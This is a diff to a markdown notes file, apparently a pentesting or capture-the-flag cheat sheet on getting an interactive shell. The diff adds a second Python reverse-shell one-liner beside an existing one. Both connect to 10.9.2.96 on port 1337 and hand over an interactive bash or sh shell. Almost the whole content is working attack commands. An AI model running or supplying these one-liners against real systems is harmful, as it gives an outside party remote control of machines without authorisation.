@@ -26,7 +26,10 @@ To fool commands like `su username`when you need a proper terminal to execute th
 https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
 
 python3 -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.2.96",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.2.96",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMjM1MjQ1MjMyLDE0NjE3NDQwNiwxOTM4Mj
-ExODQ2LC0xNDI1MTQwOTcsMTkxMzU5MjE5MV19
+eyJoaXN0b3J5IjpbLTExNzA0Njk4NTIsMjM1MjQ1MjMyLDE0Nj
+E3NDQwNiwxOTM4MjExODQ2LC0xNDI1MTQwOTcsMTkxMzU5MjE5
+MV19
 -->
